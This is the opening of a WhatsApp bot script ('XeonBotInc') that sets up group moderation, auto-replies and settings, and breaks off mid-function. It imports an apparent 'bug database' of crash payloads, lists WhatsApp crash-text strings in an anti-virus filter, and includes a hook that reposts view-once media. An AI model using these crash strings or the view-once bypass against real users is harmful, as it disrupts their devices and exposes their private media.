//base by DGXeon
//re-upload? recode? copy code? give credit ya :)
//YouTube: @DGXeon
//Instagram: unicorn_xeon13
//Telegram: t.me/xeonbotinc
//GitHub: @DGXeon
//WhatsApp: +916909137213
//want more free bot scripts? 
//subscribe to my youtube channel: https://youtube.com/@DGXeon

process.on('unhandledRejection', console.error)
process.on('uncaughtException', console.error)
require('./settings');
const fs = require('fs');
const os = require('os');
const util = require('util');
const jimp = require('jimp');
const path = require('path');
const https = require('https');
const fse = require('fs-extra');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@distube/ytdl-core');
const cron = require('node-cron');
const cheerio = require('cheerio');
const request = require('request');
const maker = require('mumaker');
const fetch = require('node-fetch');
const FileType = require('file-type');
const { JSDOM } = require('jsdom');
const agent = require('superagent');
const webp = require('node-webpmux');
const ffmpeg = require('fluent-ffmpeg');
const speed = require('performance-now');
const { performance } = require('perf_hooks');
const moment = require('moment-timezone');
const { exec, spawn, execSync } = require('child_process');
const googleTTS = require('google-tts-api');
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const fsx = require('fs-extra');
const fg = require('api-dylux');
const { download } = require('aptoide-scraper');
const scp2 = require('./lib/scraper2');
const jsobfus = require('javascript-obfuscator');
const {translate} = require('@vitalets/google-translate-api');
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage} = require('@whiskeysockets/baileys');

let ntnsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/badword.json'))

//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)

//media
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvn.json'));
const StickerXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonsticker.json'));
const ImageXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonimage.json'));
const VideoXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvideo.json'));
const DocXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/doc.json'));
const ZipXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/zip.json'));
const ApkXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/apk.json'));

const prem = require('./src/premium');
const owner = JSON.parse(fs.readFileSync('./src/owner.json'));
const { TelegraPh, UploadFileUgu } = require('./lib/uploader');
const uploadImage = require('./lib/uploadImage');
const {
    toAudio,
    toPTT,
    toVideo,
    addExifAvatar,
    makeid,
  Telesticker,
  formatBytes,
  formatDuration
} = require('./lib/converter');
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list');
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js');
const { imageToWebp, videoToWebp, writeExif, writeExifImg, writeExifVid } = require('./lib/exif');
const { chatGpt, tiktokDl, ytMp4, ytMp3 } = require('./lib/screaper');
const { gameSlot, gameCasinoSolo, gameMerampok, gameTangkapOr, daily, transferLimit, transferUang, buy, setLimit, setUang } = require('./lib/game');
const { pinterest, wallpaper, wikimedia, quotesAnime, happymod, umma, ringtone, jadwalsholat, styletext } = require('./lib/scraper');
const { formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, webApi, parseMention, generateProfilePicture, getRandom, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, generateToken, batasiTeks, randomText, isEmoji, getAllHTML, fetchBuffer, GIFBufferToVideoBuffer } = require('./lib/function');
// Read Database
let vote = db.others.vote = []
const xeonverifieduser = JSON.parse(fs.readFileSync('./src/user.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
			users: {},
			groups: {},
			database: {},
			 settings: {},
			others: {},
...(global.db || {})
}

module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
	try {
		const {
            type
        } = m
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const XeonTheCreator = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
		const budy = (typeof m.text == 'string' ? m.text : '')
		const prefix = /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : '.'
		const isCmd = body.startsWith(prefix)
		//prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const xeonybody = body.startsWith(pric)
        const isCommand = xeonybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
		const args = body.trim().split(/ +/).slice(1)
		const getQuoted = (m.quoted || m)
		const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
		const command = XeonTheCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
		const text = q = args.join(' ')
		const mime = (quoted.msg || quoted).mimetype || ''
		const qmsg = (quoted.msg || quoted)
		const sender = m.sender
		const isUser = xeonverifieduser.includes(sender)
		const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
		const participants = m.isGroup ? await groupMetadata.participants : ''
		if (m.isGroup) {
			m.metadata = await XeonBotInc.groupMetadata(m.chat)
			m.admins = (m.metadata.participants.reduce((a, b) => (b.admin ? a.push({ id: b.id, admin: b.admin }) : [...a]) && a, []))
			m.isAdmin = m.admins.some((b) => b.id === m.sender)
			m.participant = m.key.participant
			m.isBotAdmin = !!m.admins.find((member) => member.id === botNumber)
		}
		
		//media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' 
        const isQuotedImage = type === 'extendedTextMessage' 
        const isQuotedLocation = type === 'extendedTextMessage' 
        const isQuotedVideo = type === 'extendedTextMessage' 
        const isQuotedSticker = type === 'extendedTextMessage'
        const isQuotedAudio = type === 'extendedTextMessage' 
        const isQuotedContact = type === 'extendedTextMessage' 
        const isQuotedDocument = type === 'extendedTextMessage'
		//anti media
        const isXeonMedia = m.mtype
		
		try {
		const isNumber = x => typeof x === 'number' && !isNaN(x)
		const isBoolean = x => typeof x === 'boolean' && Boolean(x)
		let user = global.db.users[m.sender]
		let limitUser = user ? (user.vip ? global.limit.vip : prem.checkPremiumUser(m.sender, premium) ? global.limit.premium : global.limit.free) : prem.checkPremiumUser(m.sender, premium) ? global.limit.premium : global.limit.free
		let uangUser = user ? (user.vip ? global.uang.vip : prem.checkPremiumUser(m.sender, premium) ? global.uang.premium : global.uang.free) : prem.checkPremiumUser(m.sender, premium) ? global.uang.premium : global.uang.free
		if (typeof user !== 'object') global.db.users[m.sender] = {}
		if (user) {
			if (!('vip' in user)) user.afkReason = false
			if (!isNumber(user.afkTime)) user.afkTime = -1
			if (!('afkReason' in user)) user.afkReason = ''
			if (!isNumber(user.limit)) user.limit = limitUser
			if (!('uang' in user)) user.uang = uangUser
			if (!('lastclaim' in user)) user.lastclaim = new Date * 1
			if (!('lastrampok' in user)) user.lastrampok = new Date * 1
		} else {
			global.db.users[m.sender] = {
				vip: false,
				afkTime: -1,
				afkReason: '',
				limit: limitUser,
				uang: uangUser,
				lastclaim: new Date * 1,
				lastrampok: new Date * 1,
			}
		}
			let group = global.db.groups[m.chat]
			if (typeof group !== 'object') global.db.groups[m.chat] = {}
			if (group) {
				if (!('ntnsfw' in group)) group.ntnsfw = false
				  if (!('welcome' in group)) group.welcome = false
                  if (!('setinfo' in group)) group.setinfo = false
				  if (!('badword' in group)) group.badword = false
                  if (!('antiforeignnum' in group)) group.antiforeignnum = false
                  if (!('antibot' in group)) group.antibot = false
                  if (!('antiviewonce' in group)) group.antiviewonce = false
                  if (!('antispam' in group)) group.antispam = false
                  if (!('antimedia' in group)) group.media = false
                  if (!('antivirtex' in group)) group.antivirtex = false
                  if (!('antiimage' in group)) group.antiimage = false
                  if (!('antivideo' in group)) group.video = false
                  if (!('antiaudio' in group)) group.antiaudio = false
                  if (!('antipoll' in group)) group.antipoll = false
                  if (!('antisticker' in group)) group.antisticker = false
                  if (!('anticontact' in group)) group.anticontact = false
                  if (!('antilocation' in group)) group.antilocation = false
                  if (!('antidocument' in group)) group.antidocument = false
                  if (!('antilink' in group)) group.antilink = false
                  if (!('antipromotion' in group)) group.antipromotion = false
                  if (!('antidelete' in group)) group.antidelete = true
			} else {
				global.db.groups[m.chat] = {
				  ntsfw: false,
				  welcome: false,
				  setinfo: false,
				  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antidelete: true
				}
			}
		    let setting = global.db.settings[botNumber]
            if (typeof setting !== 'object') global.db.settings[botNumber] = {}
            if (setting) {
            	if (!('anticall' in setting)) setting.anticall = false
               if (!('antiswview' in setting)) setting.antiswview = false
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
            } else global.db.settings[botNumber] = {
               anticall: false,
           	antiswview: false,
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,               
            }
	} catch (e) {
		throw e;
	}
		
		const isVip = global.db.users[m.sender] ? global.db.users[m.sender].vip : false
		const isPremium = XeonTheCreator || prem.checkPremiumUser(m.sender, premium) || false
		const AntiNsfw = m.isGroup ? global.db.groups[m.chat].ntnsfw : false
		
		function pickRandom(list) {
			return list[Math.floor(list.length * Math.random())]
		}
		
		// Reset Limit
		cron.schedule('00 00 * * *', () => {
			let user = Object.keys(global.db.users)
			for (let jid of user) {
				const limitUser = global.db.users[jid].vip ? global.limit.vip : prem.checkPremiumUser(jid, premium) ? global.limit.premium : global.limit.free
				global.db.users[jid].limit = limitUser
				console.log('Limit Reseted')
			}
		}, {
			scheduled: true,
			timezone: 'Asia/Kolkata'
		})
		
		if (!XeonBotInc.public) {
			if (!m.key.fromMe) return
		}
		
		//Log
		if (m.message) {
			console.log(chalk.black.bgWhite('[ MESSAGE ]:'),chalk.black.bgGreen(new Date), chalk.black.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.black(chalk.bgCyanBright('[ FROM ] :'),chalk.bgYellow(m.pushName),chalk.bgHex('#FF449F')(m.sender),chalk.bgBlue('(' + (m.isGroup ? m.pushName : 'Private Chat', m.chat) + ')')));
		}
		
		// Grup Only
        if (!m.isGroup && !XeonTheCreator && db.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return replygcxeon(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!XeonTheCreator && db.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return replygcxeon("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
		
		// Auto Read
		if (db.settings[botNumber].autoread) {
            XeonBotInc.readMessages([m.key]);
        }
        
        //auto set bio\\
	if (db.settings[botNumber].autobio) {
            XeonBotInc.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
        
        //auto type
        if (db.settings[botNumber].autotype){
        if (m.message) {
        	let xeonpos = ['composing']
            XeonBotInc.sendPresenceUpdate(xeonpos, m.chat)
        }
        }
        
        //auto type record
        if (db.settings[botNumber].autorecordtype){
        if (m.message) {
            let xeonmix = ['composing', 'recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            XeonBotInc.sendPresenceUpdate(xeonmix2, m.chat)
        }
        }
        
        //autorecord
        if (db.settings[botNumber].autorecord){
        if (m.message) {
        	let xeonpos = ['recording']
            XeonBotInc.sendPresenceUpdate(xeonpos, m.chat)
        }
        }
        
        //unavailable
        if (db.settings[botNumber].online) {
        	if (isCmd) {
        	XeonBotInc.sendPresenceUpdate('unavailable', m.chat)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.settings[botNumber].autoblocknum === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.settings[botNumber].onlyindia === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.settings[botNumber].onlyindo === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.groups[m.chat].antiforeignnum === true){ 
        	if (XeonTheCreator || m.isAdmin || !m.isBotAdmin) return
            XeonBotInc.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        
        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        replygcxeon('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        XeonBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        replygcxeon('*Downloading status...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
        
        //autosticker
        if (db.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                XeonBotInc.sendImageAsSticker(m.chat, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                XeonBotInc.sendVideoAsSticker(m.chat, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        //antibot
        if (db.groups[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (m.isAdmin || !m.isBotAdmins){		  
        } else {
          replygcxeon(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
   
		//antiviewonce
    if ( db.groups[m.chat].antiviewonce && m.isGroup && m.mtype == "viewOnceMessageV2") {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await XeonBotInc.sendMessage(m.chat, { forward: val }, { quoted: m })    	
    }
    
    // Anti promotion
if (db.groups[m.chat].antipromotion) {
if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!m.isBotAdmin) return
if(XeonTheCreator) return
if (m.isAdmin) return
XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
XeonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

//respond
        if (db.groups[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }

//ANTI VIRUS
if (m.isGroup && db.groups[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (m.isBotAdmin) return replygcxeon('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
XeonBotInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!m.isBotAdmins) return
if(XeonTheCreator) return
XeonBotInc.groupParticipantsUpdate(m.chat, [sender], 'remove')
await XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
XeonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
    
    //anti media
        if (db.groups[m.chat].antimedia && isMedia) {
        if (XeonTheCreator || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygcxeon(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.groups[m.chat].image && isXeonMedia) {
    if(isXeonMedia === "imageMessage"){
        if (XeonTheCreator || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygcxeon(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.groups[m.chat].antivideo && isXeonMedia) {
    if(isXeonMedia === "videoMessage"){
        if (XeonTheCreator || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygcxeon(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.groups[m.chat].antisticker && isXeonMedia) {
    if(isXeonMedia === "stickerMessage"){
        if (XeonTheCreator || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygcxeon(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.groups[m.chat].antiaudio && isXeonMedia) {
    if(isXeonMedia === "audioMessage"){
        if (XeonTheCreator || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygcxeon(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.groups[m.chat].antipoll && isXeonMedia) {
    if(isXeonMedia === "pollCreationMessage"){
        if (XeonTheCreator || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygcxeon(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.groups[m.chat].antilocation && isXeonMedia) {
    if(isXeonMedia === "locationMessage"){
        if (XeonTheCreator || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygcxeon(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.groups[m.chat].antidocument && isXeonMedia) {
    if(isXeonMedia === "documentMessage"){
        if (XeonTheCreator || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygcxeon(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.groups[m.chat].anticontact && isXeonMedia) {
    if(isXeonMedia === "contactMessage"){
        if (XeonTheCreator || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygcxeon(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
  
        if (db.groups[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (m.isAdmin) return replygcxeon(bvl)
if (m.key.fromMe) return replygcxeon(bvl)
if (XeonTheCreator) return replygcxeon(bvl)
               await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
